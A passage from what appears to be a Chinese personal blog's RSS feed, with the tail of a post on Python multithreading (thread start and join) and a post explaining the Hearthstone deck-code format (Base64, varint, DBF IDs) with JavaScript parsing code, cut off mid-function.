&lt;span class=&quot;n&quot;&gt;t2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fengdu_hw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t3&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fengdu_hw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hw3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;t4&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threading&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fengdu_h3c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h3c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Queue&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;t4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;threads&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;操作于 {time.strftime('&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;X')} 执行结束&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;code class=&quot;highlighter-rouge&quot;&gt;join&lt;/code&gt;方法是个很tricky的东西，至今还不是很清楚地懂这是个什么玩意儿。&lt;em&gt;join([timeout])方法阻塞了主线程，直到调用此方法的子线程完成之后主线程才继续往下运行&lt;/em&gt;。（之前我糊里糊涂地把join就紧紧接在start后面写了，如果这么写了的话那么多线程在速度上就毫无优势，和单线程一样了= =）。而像上面这个示例一样，先一个遍历把所有线程都启动起来，再用一个遍历把所有线程都join一遍似乎是比较通行的做法。&lt;/p&gt;
</description>
        <pubDate>Thu, 27 Aug 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-08-27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84python%E4%B9%8B%E8%B7%AF/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-08-27/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%84python%E4%B9%8B%E8%B7%AF/</guid>
        
        <category>python</category>
        
        
        <category>随编</category>
        
      </item>
    
      <item>
        <title>炉石卡组原理解析</title>
        <description>&lt;p&gt;最近看Base64的时候看到了知乎上一个关于炉石卡组代码的帖子，它本质上就是用一个Base64编码的字符串来存储卡组信息。你有时会见到以=或者==结尾的卡组代码，这正是Base64编码的典型特征。&lt;/p&gt;

&lt;h3 id=&quot;dbf-id&quot;&gt;DBF ID&lt;/h3&gt;

&lt;p&gt;为了了解编码的机制，我们需要先介绍DBF ID。这是每张炉石卡牌（包括可收集卡牌、衍生卡牌、冒险模式专属卡牌、英雄皮肤等）的唯一标识符。而炉石卡组代码正是使用DBF ID来表示每张卡牌。这也是能够卡出下图这种 BUG 的原因,皮肤被标记为了一张紫卡。
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/82526473-b262a480-9b66-11ea-9781-a4a23750a614.png&quot; alt=&quot;hsdeck1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;DBF ID可在游戏文件中找到。更加方便的方法是通过 &lt;a href=&quot;https://hearthstonejson.com&quot;&gt;HearthstoneJSON&lt;/a&gt; ，这上面提供了相关API。也可以在这个网站上直接下载最新的&lt;code class=&quot;highlighter-rouge&quot;&gt;cards.collectible.json&lt;/code&gt;，这里面包含了所有可收集卡牌的信息，例如各种语言的卡牌名称、描述等。&lt;/p&gt;

&lt;h3 id=&quot;格式&quot;&gt;格式&lt;/h3&gt;

&lt;p&gt;如前所述，卡组代码是 Base64 编码的字符串。我们先来解码它，许多编程语言都可以做到这一点，以js 为例：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parse_deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;binary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;from&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;deckstring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;binary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;match&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;{1,2}&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/g&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;parseInt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这个函数会先将Base64字符串解码成2进制，然后转换成16进制，再按每两个元素切割，最后从16进制字符串转化为整型并返回。也就是说，它们可以是 0x00-0xff，即 0-255。&lt;/p&gt;

&lt;p&gt;现在我们得到的是一个由整数组成的数组。更具体的来说，就是 varint。还需要进一步的解码，才能读取出有用的信息：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7f&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;shift&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这里的&lt;code class=&quot;highlighter-rouge&quot;&gt;data.shift()&lt;/code&gt;会将数组的第一个元素移出数组，并返回它的值。&lt;code class=&quot;highlighter-rouge&quot;&gt;read_varint()&lt;/code&gt;函数完成了解码过程，不断地执行&lt;code class=&quot;highlighter-rouge&quot;&gt;read_varint()&lt;/code&gt;，直到取完arr中的元素，就能把内容全部解码出来。&lt;/p&gt;

&lt;p&gt;根据作用，可以把解码后的卡组代码分为两个部分：元数据块和卡牌块。&lt;/p&gt;

&lt;h3 id=&quot;元数据块&quot;&gt;元数据块&lt;/h3&gt;

&lt;p&gt;在arr数组中，前五个元素分别为：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;保留字节 0x00&lt;/li&gt;
  &lt;li&gt;版本号（固定为 1）&lt;/li&gt;
  &lt;li&gt;模式（1 为狂野，2 为标准）&lt;/li&gt;
  &lt;li&gt;使用英雄卡牌的数量（固定为 1）&lt;/li&gt;
  &lt;li&gt;使用的英雄卡牌的类型（长度不确定，一般是 1-3 位）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;可见卡组代码以字节 0x00 开头。然后是编码版本号，目前始终为 1。虽然这五个元素并没有官方名称，不过从作用上可以看作元数据。&lt;/p&gt;

&lt;h3 id=&quot;卡牌块&quot;&gt;卡牌块&lt;/h3&gt;

&lt;p&gt;在元数据块之后，继续读取arr的元素，那么接下来就轮到卡牌块了。它按以下顺序分为三对长度 + 数组的组合：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;卡组中存在一张的卡&lt;/li&gt;
  &lt;li&gt;卡组中存在两张的卡&lt;/li&gt;
  &lt;li&gt;卡组中存在 n 张的卡&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;每张卡都用 varint 型的 DBF ID 表示。&lt;/p&gt;

&lt;p&gt;所谓「卡组中存在 n 张的卡」，指的是卡组中的所有其他卡牌。此数组是一个 varint 对组成的列表，每一对的第一个元素表示 DBF ID，第二个元素是该卡牌在卡组中出现的次数。它应该只包含在牌组中至少出现三次的牌，因而意味着它（在这种情况下）对于构筑卡组应当是空的（毕竟一张卡最多只能带两张）。&lt;/p&gt;

&lt;p&gt;尽管最终排序无关紧要，但卡牌仍会在各自所在的数组中，按 DBF ID 的升序进行排序，以便始终为相同的卡组生成相同的卡组代码。我们称所有按照这种方式排列卡牌列表（包括英雄）的卡组代码为规范的卡组代码。下面的参考实现应该已经可以生成规范的卡组代码：&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;parse_deck&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;reserve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reserve&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Invalid deckstring&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Unsupported deckstring version &lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_heroes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_x2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
